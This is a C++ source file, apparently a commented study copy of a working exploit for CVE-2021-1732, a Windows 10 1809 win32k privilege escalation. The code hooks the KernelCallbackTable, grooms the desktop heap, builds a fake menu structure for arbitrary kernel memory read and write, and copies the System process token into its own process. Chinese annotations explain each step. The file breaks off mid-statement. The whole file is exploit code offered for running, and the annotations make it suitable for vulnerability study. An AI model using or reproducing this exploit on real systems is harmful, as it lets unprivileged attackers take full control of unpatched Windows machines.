#include <Windows.h>
#include <intrin.h>
#include <memoryapi.h>
#include <atlbase.h>
#include <atlconv.h>
#include <WinUser.h>
#include <stdio.h>
#include <iostream>

//Create by kk(2021.02.23)
//CVE-2021-1732 Exp test example working in windows 10 1809 x64

void OutputDebugPrintf(const char* strOutputString, ...)
{
    char strBuffer[4096] = { 0 };
    va_list vlArgs;
    va_start(vlArgs, strOutputString);

    _vsnprintf_s(strBuffer, sizeof(strBuffer) - 1, strOutputString, vlArgs);
    va_end(vlArgs);
    OutputDebugString(CA2W(strBuffer));
}

typedef PVOID(WINAPI* FHMValidateHandle)(HANDLE h, BYTE byType);

bool FindHMValidateHandle(FHMValidateHandle *pfOutHMValidateHandle)
{
    *pfOutHMValidateHandle = NULL;
    HMODULE hUser32 = GetModuleHandle(L"user32.dll");
    // user32!IsMenu
    PBYTE pMenuFunc = (PBYTE)GetProcAddress(hUser32, "IsMenu");
    if (pMenuFunc) {
        for (int i = 0; i < 0x100; ++i) 
        {
            if (0xe8 == *pMenuFunc++) // 找到第一个 call 指令(0xE8 是 call 指令的 opcode)
            {   // call 指令的操作数是一个偏移，计算方法为（目标地址 - call 指令地址 - 5）
                DWORD ulOffset = *(PINT)pMenuFunc;
                // 计算得到 user32!HMValidateHandle 地址
                *pfOutHMValidateHandle = (FHMValidateHandle)(pMenuFunc + 5 + (ulOffset & 0xffff) - 0x10000  - ((ulOffset >> 16 ^ 0xffff) * 0x10000) );
                break;
            }
        }
    }
    return *pfOutHMValidateHandle != NULL ? true : false;
}

typedef NTSTATUS(WINAPI* FxxxClientAllocWindowClassExtraBytes)(unsigned int* pSize);
FxxxClientAllocWindowClassExtraBytes g_fxxxClientAllocWindowClassExtraBytes = NULL;

typedef NTSTATUS(WINAPI* FxxxClientFreeWindowClassExtraBytes)(PVOID pAddress);
FxxxClientFreeWindowClassExtraBytes g_fxxxClientFreeWindowClassExtraBytes = NULL;


typedef NTSTATUS(WINAPI* FNtUserConsoleControl)(DWORD, ULONG_PTR, ULONG);
typedef NTSTATUS(WINAPI* FNtCallbackReturn)(PVOID Result, ULONG ResultLength, NTSTATUS Status);

typedef PVOID(WINAPI* RtlAllocateHeap)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
RtlAllocateHeap g_fRtlAllocateHeap = NULL;

FNtUserConsoleControl g_fNtUserConsoleControl = NULL;
FNtCallbackReturn g_fFNtCallbackReturn = NULL;
FHMValidateHandle fHMValidateHandle = NULL;

DWORD g_dwMyWndExtra = 0x1234;

HWND g_hWnd[0x100] = { 0 };//存储窗口句柄
ULONG_PTR g_pWnd[0x100] = { 0 }; //保存泄露的tagWNDk 在用户空间的映射指针

DWORD g_cbWndExtra_offset = 0xC8; //0xC8 cbWndExtra 窗口的扩展内存大小
DWORD g_dwExStyle_offset = 0x18;
DWORD g_dwStyle_offset = 0x1C;
DWORD g_dwModifyOffsetFlag_offset = 0xE8;
DWORD g_dwModifyOffset_offset = 0x128; //0x128 pExtraBytes
DWORD g_dwEPROCESS_UniqueProcessId_offset = 0x2E0; // pid
DWORD g_dwEPROCESS_ActiveProcessLinks_offset = 0x2E8;// 0x2E8 ActiveProcessLinks.Flink 指向下一个 EPROCESS 结构体的 ActiveProcessLinks
DWORD g_dwEPROCESS_Token_offset = 0x358; //token

DWORD g_dwKernel_pWnd_offset = 8;//ptagWNDk(0x28 ptagWNDk) + 0x08(0x08 kernel desktop heap base offset) 保存了 tagWNDk 相对于桌面堆基址的偏移

DWORD g_dwpWndKernel_heap_offset0 = 0; //tagWNDk 0 相对于桌面堆基址的偏移
DWORD g_dwpWndKernel_heap_offset1 = 0;//tagWNDk 1 相对于桌面堆基址的偏移
DWORD g_dwpWndKernel_heap_offset2 = 0;//tagWNDk 2 相对于桌面堆基址的偏移

ULONG_PTR g_pMyMenu = 0;

//? KernelCallbackTable 的 123 项之前被替换成自定义的 hook 函数,
//? hook 函数如下
NTSTATUS WINAPI MyxxxClientAllocWindowClassExtraBytes(unsigned int* pSize)
{   // 只有参数为 0x1234 时，才进行操作。
    //即只有 286 行创建 Class2 的窗口时才会进到这
    if (*pSize == g_dwMyWndExtra) //g_dwMyWndExtra=0X1234
    {
        ULONG_PTR ululValue = 0;

        HWND hWnd2 = NULL;

        //Search free 50 kernel mapping desktop heap (cbwndextra == g_dwMyWndExtra) points to hWnd
        // 搜索释放掉的后 48 个窗口对应的 tagWNDk，
        //寻找新窗口的 tagWNDk 复用了哪个地址
        //（这里应该是 i < 50，不过无伤大雅）
        for (int i = 2; i < 48; i++) 
        {
            // 取来每个 cbWndExtra
            ULONG_PTR cbWndExtra = *(ULONG_PTR*)(g_pWnd[i] + g_cbWndExtra_offset);
            if (cbWndExtra == g_dwMyWndExtra) // 找到新窗口的 tagWNDk
            {
                hWnd2 = (HWND)*(ULONG_PTR*)(g_pWnd[i]); //Found the "class2" window handle ，&tagWNDk + 0 存放窗口句柄
                break;
            }
        }/**/
        if (hWnd2 == NULL)// 到这里说明新窗口 tagWNDk 没有复用之前的空间，则输出错误信息，这里再加个结束程序会好些
        {
            //Found fail.
            std::cout << "Search free 48 kernel mapping desktop heap (cbwndextra == g_dwMyWndExtra) points to hWnd fail." << std::endl;
        }
        else 
        {
            std::cout << "Search kernel mapping desktop heap points to hWnd: " << std::hex << hWnd2 << std::endl;
        }
        //? 对新窗口（窗口 2）调用 ConsoleControl，
        //使其 pExtraBytes 处于 offset 间接寻址模式
        ULONG_PTR ConsoleCtrlInfo[2] = { 0 };
        ConsoleCtrlInfo[0] = (ULONG_PTR)hWnd2;// 第一个 8 字节放窗口句柄
        ConsoleCtrlInfo[1] = ululValue;// 0
        NTSTATUS ret = g_fNtUserConsoleControl(6, (ULONG_PTR)&ConsoleCtrlInfo, sizeof(ConsoleCtrlInfo));

        ULONG_PTR Result[3] = { 0 };// 返回信息长度为 0x18
        Result[0] = g_dwpWndKernel_heap_offset0; // 第一个 8 字节会被用于赋值 pExtraBytes
        return g_fFNtCallbackReturn(&Result, sizeof(Result), 0);// tagWNDk2.pExtraBytes 语义上指向 tagWNDk0
    }
    return g_fxxxClientAllocWindowClassExtraBytes(pSize);//创建 50 个 Class1 的窗口时，都直接调用原函数
}

//? 钩子函数2 但和原函数没区别。直接调用了原函数
NTSTATUS WINAPI MyxxxClientFreeWindowClassExtraBytes(PVOID pInfo)
{
    PVOID pAddress = *(PVOID*)((PBYTE)pInfo + 8);
    return g_fxxxClientFreeWindowClassExtraBytes(pInfo);
}

LRESULT CALLBACK MyDefWindowProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

//Read kernel memory for 16 length
// 通过函数 ReadKernelMemoryQQWORD 封装任意地址读功能
//! 参数 pAddress 为要读的地址 p，ululOutVal1 和 ululOutVal2 存储读出来的 16 字节
//! 其中 ululOutVal1 = *(__int64 *)p，ululOutVal2 = *(__int64 *)(p + 8)
void ReadKernelMemoryQQWORD(ULONG_PTR pAddress, ULONG_PTR &ululOutVal1, ULONG_PTR &ululOutVal2)
{
    MENUBARINFO mbi = { 0 };
    mbi.cbSize = sizeof(MENUBARINFO);

    RECT Rect = { 0 };
    GetWindowRect(g_hWnd[1], &Rect); // 获取窗口 1 的 RECT 信息，用于计算读出的真实值

    *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x58)) = pAddress - 0x40; //0x44 xItem  rgItems->unknown
    GetMenuBarInfo(g_hWnd[1], -3, 1, &mbi); // 读取

    BYTE pbKernelValue[16] = { 0 };
    *(DWORD*)(pbKernelValue) = mbi.rcBar.left - Rect.left;// 减去 Rect.left，创建窗口时，该值被指定为 0
    *(DWORD*)(pbKernelValue + 4) = mbi.rcBar.top - Rect.top;// 减去 Rect.top，创建窗口时，该值被指定为 0
    *(DWORD*)(pbKernelValue + 8) = mbi.rcBar.right - mbi.rcBar.left;
    *(DWORD*)(pbKernelValue + 0xc) = mbi.rcBar.bottom - mbi.rcBar.top;

    ululOutVal1 = *(ULONG_PTR*)(pbKernelValue);// 成功读出 pAddress 开始的 16 字节
    ululOutVal2 = *(ULONG_PTR*)(pbKernelValue + 8);

    /*std::cout 
        << "ReadKernelMemory ululOutVal1: " 
        << std::hex << ululOutVal1 
        << " ululOutVal2: " 
        << std::hex << ululOutVal2 << std::endl;*/
}
//winmin入口
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: Place code here.
    AllocConsole(); //创建一个控制台
    FILE* tempFile = nullptr;
    freopen_s(&tempFile, "conin$", "r+t", stdin); // 重定向程序的标准输入到控制台
    freopen_s(&tempFile, "conout$", "w+t", stdout);// 重定向程序的标准输出到控制台

    typedef void(WINAPI* FRtlGetNtVersionNumbers)(DWORD*, DWORD*, DWORD*); //未公开函数，需要声明
    DWORD dwMajorVer, dwMinorVer, dwBuildNumber = 0;
    //通过未公开函数获取版本号
    FRtlGetNtVersionNumbers fRtlGetNtVersionNumbers = (FRtlGetNtVersionNumbers)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetNtVersionNumbers");
    fRtlGetNtVersionNumbers(&dwMajorVer, &dwMinorVer, &dwBuildNumber);
    dwBuildNumber &= 0x0ffff;

    std::cout << "Example CVE-2021-1732 Exp working in windows 10 1809(17763).\n";
    std::cout << "Current system version:\n"; //输出当前版本号
    std::cout << "  MajorVer:" << dwMajorVer << " MinorVer:" << dwMinorVer << " BuildNumber:" << dwBuildNumber << std::endl;
    system("pause");

    //这几个都是未公开函数    
    //GetProcAddress如果函数成功，则返回值是导出的函数或变量的地址。
    // win32u!NtUserConsoleControl（其实用 user32!ConsoleControl 效果一样）
    g_fNtUserConsoleControl = (FNtUserConsoleControl)GetProcAddress(GetModuleHandle(L"win32u.dll"), "NtUserConsoleControl");
    // ntdll!NtCallbackReturn
    g_fFNtCallbackReturn = (FNtCallbackReturn)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCallbackReturn");
    // ntdll!RtlAllocateHeap
    g_fRtlAllocateHeap = (RtlAllocateHeap)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlAllocateHeap");
    
    //! gs:[0x60] 指向进程 PEB，PEB 结构体偏移 0x58 为 KernelCallbackTable
    ULONG_PTR pKernelCallbackTable = (ULONG_PTR) *(ULONG_PTR*)(__readgsqword(0x60) + 0x58); //PEB->KernelCallbackTable
    
    // KernelCallbackTable 第 123(123*8=984=0x3D8) 项为 user32!_xxxClientAllocWindowClassExtraBytes
    g_fxxxClientAllocWindowClassExtraBytes = (FxxxClientAllocWindowClassExtraBytes)*(ULONG_PTR*)((PBYTE)pKernelCallbackTable + 0x3D8);
    
    // 第 124 项为 user32!_xxxClientFreeWindowClassExtraBytes（调试用）
    //? 第 124 项的 hook 应该是作者为了调试 EXP 而加的，其 hook 函数原封不动地调用了原函数
    g_fxxxClientFreeWindowClassExtraBytes = (FxxxClientFreeWindowClassExtraBytes)*(ULONG_PTR*)((PBYTE)pKernelCallbackTable + 0x3E0);
    
    // user32!HMValidateHandle
    FindHMValidateHandle(&fHMValidateHandle);
    //!? 开始挂钩
    DWORD dwOldProtect = 0;
    // 给 KernelCallbackTable 所在的内存添加可写权限
    VirtualProtect((PBYTE)pKernelCallbackTable + 0x3D8, 0x400, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    // hook 123 项
    *(ULONG_PTR*)((PBYTE)pKernelCallbackTable + 0x3D8) = (ULONG_PTR)MyxxxClientAllocWindowClassExtraBytes;//!? 将钩子函数的地址写进表里进行替换
    // hook 124 项，调试用
    *(ULONG_PTR*)((PBYTE)pKernelCallbackTable + 0x3E0) = (ULONG_PTR)MyxxxClientFreeWindowClassExtraBytes;
    // 还原内存权限
    VirtualProtect((PBYTE)pKernelCallbackTable + 0x3D8, 0x400, dwOldProtect, &dwOldProtect);

    
    //!? 开始注册两个窗口类
    ATOM atom1, atom2 = 0;

    WNDCLASSEX WndClass = { 0 };
    WndClass.cbSize = sizeof(WNDCLASSEX);
    WndClass.lpfnWndProc = DefWindowProc; //使用默认窗口过程
    WndClass.style = CS_VREDRAW| CS_HREDRAW;
    WndClass.cbWndExtra = 0x20; // Class1 窗口扩展内存的大小为 0x20
    WndClass.hInstance = hInstance;
    WndClass.lpszMenuName = NULL;
    WndClass.lpszClassName = L"Class1";// 窗口类名为 Class1
    atom1 = RegisterClassEx(&WndClass); // 注册 Class1

    WndClass.cbWndExtra = g_dwMyWndExtra; // Class2 窗口扩展内存的大小为 0x1234
    WndClass.hInstance = hInstance;
    WndClass.lpszClassName = L"Class2"; // 窗口类名为 Class2
    atom2 = RegisterClassEx(&WndClass); // 注册 Class2
    

     //开始创建销毁窗口，进行堆风水排布
    
    ULONG_PTR dwpWnd0_to_pWnd1_kernel_heap_offset = 0;// 两个偏移相减得到两个tagWNDk的距离，也是两个内核桌面堆的距离
    for (int nTry = 0; nTry < 5; nTry++) // 最多尝试 5 次内存布局
    {
        //start memory layout

        HMENU hMenu = NULL;
        HMENU hHelpMenu = NULL;
        //alloc 50 desktop heap address // 创建 50 个窗口
        for (int i = 0; i < 50; i++) 
        {
            if (i == 1) // i = 1 时创建一个菜单 hMenu
            {
                hMenu = CreateMenu();
                hHelpMenu = CreateMenu();
                //          2.控制新菜单项的外观和行为  3.新菜单项的标识符  4.新菜单项的内容
                AppendMenu(hHelpMenu, MF_STRING, 0x1888, TEXT("about"));// 准备一个 Item
                //3.如果 uFlags（参数二） 设置为MF_POPUP，则为下拉菜单或子菜单的句柄
                //此标志用于将菜单名称添加到菜单栏，或将子菜单打开到下拉菜单、子菜单或快捷菜单的菜单项。
                AppendMenu(hMenu, MF_POPUP, (LONG)hHelpMenu, TEXT("help"));// 为菜单添加 Item
            }
            // 创建窗口，只有窗口 0 没有菜单
            g_hWnd[i] = CreateWindowEx(NULL, L"Class1", NULL, WS_VISIBLE, 0, 0, 1, 1, NULL, hMenu, hInstance, NULL);
            //? 通过未公开函数 user32!HMValidateHandle 泄露每个窗口 tagWNDk 在用户空间的映射指针
            g_pWnd[i] = (ULONG_PTR)fHMValidateHandle(g_hWnd[i], 1); //Get leak kernel mapping desktop heap address
        }
        
        
        //free 48 desktop heap address
        //! 销毁掉后 48 个窗口，使它们 tagWNDk 占用的桌面堆块处于空闲状态，
        //再创建窗口时很有可能再用到这些空闲的堆块
        for (int i = 2; i < 50; i++) 
        {
            if (g_hWnd[i] != NULL) 
            {
                DestroyWindow((HWND)g_hWnd[i]);
            }
        }
        
        //? ptagWNDk(0x28 ptagWNDk) + 0x08(0x08 kernel desktop heap base offset) 保存了 tagWNDk 相对于桌面堆基址的偏移
        g_dwpWndKernel_heap_offset0 = *(ULONG_PTR*)((PBYTE)g_pWnd[0] + g_dwKernel_pWnd_offset);//tagWNDk 0 相对于桌面堆基址的偏移
        g_dwpWndKernel_heap_offset1 = *(ULONG_PTR*)((PBYTE)g_pWnd[1] + g_dwKernel_pWnd_offset);//tagWNDk 1 相对于桌面堆基址的偏移
        
        // 对窗口 0 调用 NtUserConsoleControl，使其 pExtraBytes 处于 offset 间接寻址模式
        ULONG_PTR ChangeOffset = 0;
        ULONG_PTR ConsoleCtrlInfo[2] = { 0 };// 参数长度为 0x10 字节
        
        ConsoleCtrlInfo[0] = (ULONG_PTR)g_hWnd[0];//! 参数信息的第一个 8 字节存放  窗口句柄
        ConsoleCtrlInfo[1] = (ULONG_PTR)ChangeOffset;// 第二个 8 字节对利用没有影响
        //调用 NtUserConsoleControl  的第 6 个功能，除了能赋值 pExtraBytes，还能设置 tagWNDk.dwExtraFlag |= 0x800
        //调用 SetWindowLong 写窗口扩展内存时，如果 dwExtraFlag & 0x800 != 0，则使用 offset 间接寻址方式写桌面堆
        NTSTATUS ret1 = g_fNtUserConsoleControl(6, (ULONG_PTR)&ConsoleCtrlInfo, sizeof(ConsoleCtrlInfo));
        
        // 现在窗口 0 重新在桌面堆申请了一片空间作为扩展内存，
        //? pExtraBytes 存储其相对于桌面堆基址的偏移  0x128 pExtraBytes
        dwpWnd0_to_pWnd1_kernel_heap_offset = *(ULONGLONG*)((PBYTE)g_pWnd[0] + 0x128); //现在存的是tagWNDk0相对于桌面堆基址的偏移
        
        //! 需要保证这片新空间地址小于  窗口 1 tagWNDk 结构体所在的地址，
        //这样才能通过窗口 0 扩展内存越界修改 tagWNDk1
        if (dwpWnd0_to_pWnd1_kernel_heap_offset < g_dwpWndKernel_heap_offset1) //tagWNDk0相对于桌面堆基址的偏移 小于 tagWNDk1相对于桌面堆基址的偏移
        {
            // 记下它们之间的偏移
            dwpWnd0_to_pWnd1_kernel_heap_offset = (g_dwpWndKernel_heap_offset1 - dwpWnd0_to_pWnd1_kernel_heap_offset);//两个偏移相减得到两个tagWNDk的距离
            break;
        }
        else // 如果进了 else，说明这次内存布局失败，回收所有资源
        {
            //:warning SetWindowLongPtr nIndex can't < 0; continue to try
            if (g_hWnd[0] != NULL) 
            {
                DestroyWindow((HWND)g_hWnd[0]);
            }
            if (g_hWnd[1] != NULL) 
            {
                DestroyWindow((HWND)g_hWnd[1]);

                if (hMenu != NULL) 
                {
                    DestroyMenu(hMenu);
                }
                if (hHelpMenu != NULL) 
                {
                    DestroyMenu(hHelpMenu);
                }
            }
        }
        dwpWnd0_to_pWnd1_kernel_heap_offset = 0;
    }
    // 5 次尝试都失败了，退出程序
    if (dwpWnd0_to_pWnd1_kernel_heap_offset == 0) 
    {
        std::cout << "Memory layout fail. quit" << std::endl;
        system("pause");
        return 0;
    }

    //!? 使用与窗口类 1 cbWndExtra 不同的窗口类 2 创建一个新窗口，这个新窗口的 tagWNDk 对象可能会使用之前释放掉的空间
    //? CreateWindowEx最终调用 win32kfull!xxxCreateWindowEx
    //xxxCreateWindowEx 506 行调用 win32kbase!HMAllocObject 创建了一个 tagWND 结构体并返回其指针
    //当 ptagWNDk->cbWndExtra 不为 0 时，
    //? 会调用 win32kfull!xxxClientAllocWindowClassExtraBytes 来设置 ptagWNDk->pExtraBytes
    //? 而win32kfull!xxxClientAllocWindowClassExtraBytes 早已被我们修改挂钩为  MyxxxClientAllocWindowClassExtraBytes
    //! MyxxxClientAllocWindowClassExtraBytes 会将 pExtraBytes 设置为 offset 模式寻址（dwExtraFlag |= 0x800），
    //! 并将其赋值为 tagWNDk0 相对于  桌面堆基址的偏移（*(&tagWNDk0 + 8)），此时窗口2的扩展内存起始地址和WNDk0的起始地址是一样的
    HWND hWnd2 = CreateWindowEx(NULL, L"Class2", NULL, WS_VISIBLE, 0, 0, 1, 1, NULL, NULL, hInstance, NULL);//窗口2句柄
    PVOID pWnd2 = fHMValidateHandle(hWnd2, 1);// 泄露 tagWNDk2 在用户空间的映射指针
    
    //!? 任意地址读
    //! 对窗口 2 调用 SetWindowLong，nIndex 为 cbWndExtra 在结构体中的偏移（0xC8），就能修改到 tagWNDk0.cbWndExtra 了
    //! 于是窗口 2 的扩展内存（cbWndExtra）变成(指向)了 tagWNDk0 所在的空间。 每个窗口都可以通过 Windows 提供的 API 来读写自己的这片扩展内存（因为会根据桌面堆的偏移找到0的内存位置去）
    //! 将 tagWNDk0.cbWndExtra(扩展内存) 改为很大的值，窗口 0 的扩展内存可以越界写
    SetWindowLong(hWnd2, g_cbWndExtra_offset, 0x0FFFFFFFF); //Modify cbWndExtra to large value
    // 想要使用 SetWindowLongPtr 修改 spMenu 的功能（-12），tagWNDk.dwStyle 需要带有 WS_CHILD 属性
    ULONGLONG ululStyle = *(ULONGLONG*)((PBYTE)g_pWnd[1] + g_dwExStyle_offset);
    ululStyle |= 0x4000000000000000L;//添加 WS_CHILD 属性
    // 对窗口 0 调用 SetWindowLongPtr，修改 tagWNDk1.dwStyle，使其带有 WS_CHILD
    //               1.hwnd      2.与要设置的值的从零开始的偏移量                           3.The replacement value
    SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);  //Modify add style WS_CHILD

    //! 构造一个 伪造spMenu（tagMENU）用于读
    /*
    0x90 spMenu(analyzed by myself)
        0x00 hMenu
        0x18 unknown0
            0x100 unknown
                0x00 pEPROCESS(of current process)
        0x28 unknown1
            0x2C cItems(for check)
        0x40 unknown2(for check)
        0x44 unknown3(for check)
        0x50 ptagWND
        0x58 rgItems
            0x00 unknown(for exploit)
        0x98 spMenuk
            0x00 pSelf
    */
    //My spmenu memory struct For read kernel memory
    // 1.将从中分配内存的专用堆的句柄。此参数是从成功调用 RtlCreateHeap 返回的句柄 3.大小  分配一个大小A0（160）的堆 spMenu
    g_pMyMenu = (ULONG_PTR)g_fRtlAllocateHeap((PVOID)* (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0xA0);
    //0x98偏移处是 spMenuk
    *(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x98) = (ULONG_PTR)g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x20);
    //! spMenu->spMenuk->pSelf ,spMenu->spMenuk->pSelf 是一个指向 spMenu 自身的指针
    **(ULONG_PTR**)((PBYTE)g_pMyMenu + 0x98) = g_pMyMenu;//ULONG_PTR
    // unknown1
    *(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x28) = (ULONG_PTR)g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x200);
    //rgItems 1
    *(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x58) = (ULONG_PTR)g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x8); 
    // unknown1->cItems
    *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x28) + 0x2C) = 1;
    // unknown2
    *(DWORD*)((PBYTE)g_pMyMenu + 0x40) = 1;
    // unknown3
    *(DWORD*)((PBYTE)g_pMyMenu + 0x44) = 2;
    
    //! 0x58 rgItems->unknown，
    //!? 如果伪造的 tagMENU 结构体中 rgItems->unknown 为   欲读取的地址 – 0x40，
    //? 那么就能从 第四个参数 pmbi 获得欲读取地址开始的 16 个字节
    *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x58)) = 0x4141414141414141; //用到的时候再初始化
    
    //? 修改窗口 1 的 fake spMenu，同时泄露原 spMenu
    ULONG_PTR pSPMenu = SetWindowLongPtr(g_hWnd[1], GWLP_ID, (LONG_PTR)g_pMyMenu); //Return leak kernel address and set fake spmenu memory
    //pSPMenu leak kernel address, good!!!
    
    // 调用 GetMenuBarInfo 时，tagWNDk.dwStyle 不能包含 WS_CHILD
    ululStyle &= ~0x4000000000000000L;//去除 WS_CHILD 属性
    // 移除窗口 1 的 WS_CHILD 样式
    SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);  //Modify Remove Style WS_CHILD

    ULONG_PTR ululValue1 = 0, ululValue2 = 0; //ReadKernelMemoryQQWORD 的两个参数
    
    //! 通过函数 ReadKernelMemoryQQWORD 封装任意地址读功能
    //! // **(__int64 **)(*(__int64 *)(spMenu + 0x18) + 0x100) 为进程 EPROCESS 结构体地址
    //? **(ULONG_PTR**)(*(ULONG_PTR*)(pSPMenu + 0x18) + 0x100) Is my kernel eprocess
    //? 0x18 unknown0 0x100 unknown  0x00   pEPROCESS  of current process
    //参数 pAddress 为要读的地址 p，ululOutVal1 和 ululOutVal2 存储读出来的 16 字节
    ReadKernelMemoryQQWORD(pSPMenu + 0x18, ululValue1, ululValue2); //read unknown0
    ReadKernelMemoryQQWORD(ululValue1 + 0x100, ululValue1, ululValue2);//read pEPROCESS
    ReadKernelMemoryQQWORD(ululValue1, ululValue1, ululValue2);//read  EPROCESS

    ULONG_PTR pMyEProcess = ululValue1; //current EPROCESS
    // 输出 EPROCESS 地址到控制台
    std::cout<< "Get current kernel eprocess: " << pMyEProcess << std::endl;

    
    //!? 进程权限提升
    ULONG_PTR pSystemEProcess = 0;

    ULONG_PTR pNextEProcess = pMyEProcess;
    //遍历 EPROCESS->ActiveProcessLinks 链表，
    //找到 System 进程，将其 Token 复制到当前进程
    for (int i = 0; i < 500; i++) 
    {
        // 读出 pEPROCESS->ActiveProcessLinks.Flink 的值
        ReadKernelMemoryQQWORD(pNextEProcess + g_dwEPROCESS_ActiveProcessLinks_offset, ululValue1, ululValue2);
        // 减去 ActiveProcessLinks 字段在 EPROCESS 结构体中的偏移，得到下一个进程 EPROCESS 结构体首地址
        pNextEProcess = ululValue1 - g_dwEPROCESS_ActiveProcessLinks_offset;
        // 读取下一个进程 pid
        ReadKernelMemoryQQWORD(pNextEProcess + g_dwEPROCESS_UniqueProcessId_offset, ululValue1, ululValue2);

        ULONG_PTR nProcessId = ululValue1;
        if (nProcessId == 4) //! System process id
        { 
            pSystemEProcess = pNextEProcess;
            std::cout << "System kernel eprocess: " << std::hex << pSystemEProcess << std::endl;
            // 读取 System 进程的 Token
            ReadKernelMemoryQQWORD(pSystemEProcess + g_dwEPROCESS_Token_offset, ululValue1, ululValue2);
            ULONG_PTR pSystemToken = ululValue1;

            //当前进程token
            ULONG_PTR pMyEProcessToken = pMyEProcess + g_dwEPROCESS_Token_offset;

            //! Write kernel memory 替换当前进程的 Token 为 System Token
            // 修改 tagWNDk1.pExtraBytes 为当前进程 &pEPROCESS->Token
              
            //! dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwModifyOffset_offset 起始地址为窗口0的开始，加上两个tagWNDK的距离则得到 窗口1 的开始
            //! 窗口1 再加上 0x128则得到 窗口1的 pExtraBytes
            //? 对窗口 0 调用 SetWindowLongPtr，修改 tagWNDk1.pExtraBytes 当前epross的值
            //! 则tagWNDk1.pExtraBytes 会处于直接寻址模式，再对窗口 1 调用 SetWindowLongPtr 就能实现任意地址写了
            //!? 如果函数成功，则返回值是指定偏移量的 之前的值。 用于保存旧的值，便于还原
            LONG_PTR old = SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)pMyEProcessToken);
            
            // 窗口 1 的 pExtraBytes 处于直接寻址模式，第二个参数直接填0，会直接根据 pExtraBytes 的地址修改值，改为系统的token
            SetWindowLongPtr(g_hWnd[1], 0, (LONG_PTR)pSystemToken);  //Modify offset to memory address
            
            // 还原 tagWNDk1.pExtraBytes 旧值
            SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)old);
            break;
        }
    }/**/

    //Recovery bug
    //! 恢复了被修改的各结构体字段，防止蓝屏的发生
    
    //tagWNDk2 相对于桌面堆基址的偏移
    g_dwpWndKernel_heap_offset2 = *(ULONG_PTR*)((PBYTE)pWnd2 + g_dwKernel_pWnd_offset);
    // tagWNDk0 在桌面堆上的扩展内存相对于桌面堆基址的偏移
    ULONG_PTR dwpWnd0_to_pWnd2_kernel_heap_offset = *(ULONGLONG*)((PBYTE)g_pWnd[0] + 0x128);
    // tagWNDk2 需在二者中较高的地址
    if (dwpWnd0_to_pWnd2_kernel_heap_offset < g_dwpWndKernel_heap_offset2) 
    {
        // 计算二者的偏移
        dwpWnd0_to_pWnd2_kernel_heap_offset = (g_dwpWndKernel_heap_offset2 - dwpWnd0_to_pWnd2_kernel_heap_offset);
        // 去掉 ptagWNDk2->dwExtraFlag 的 0x800 属性，pExtraBytes 改回直接寻址模式
        DWORD dwFlag = *(ULONGLONG*)((PBYTE)pWnd2 + g_dwModifyOffsetFlag_offset);
        dwFlag &= ~0x800;
        SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd2_kernel_heap_offset + g_dwModifyOffsetFlag_offset, dwFlag);  //Modify remove flag

        // 在用户空间堆中申请一片空间来赋值 ptagWNDk2->pExtraBytes
        PVOID pAlloc = g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, g_dwMyWndExtra);
        SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd2_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)pAlloc);  //Modify offset to memory address

        // 还原 ptagWNDk1->spMenu 时，ptagWNDk1->dwStyle 需要带有 WS_CHILD 属性
        ULONGLONG ululStyle = *(ULONGLONG*)((PBYTE)g_pWnd[1] + g_dwExStyle_offset);
        ululStyle |= 0x4000000000000000L;//WS_CHILD
        SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);  //Modify add style WS_CHILD
        // 使用 SetWindowLongPtr 自带功能（-12）还原 ptagWNDk1->spMenu
        ULONG_PTR pMyMenu = SetWindowLongPtr(g_hWnd[1], GWLP_ID, (LONG_PTR)pSPMenu);
        //free pMyMenu,// 这里应该释放伪造 tagMENU 时申请的那些空间，因为没有后续利用，写不写倒是无所谓
        // 移除窗口 1 的 WS_CHILD 样式
        ululStyle &= ~0x4000000000000000L;//WS_CHILD
        SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);  //Modify Remove Style WS_CHILD

        std::cout << "Recovery bug prevent blue screen." << std::endl;
    }
    
    //释放剩余的资源
    DestroyWindow(g_hWnd[0]);
    DestroyWindow(g_hWnd[1]);
    DestroyWindow(hWnd2);
    
    if (pSystemEProcess != NULL) {
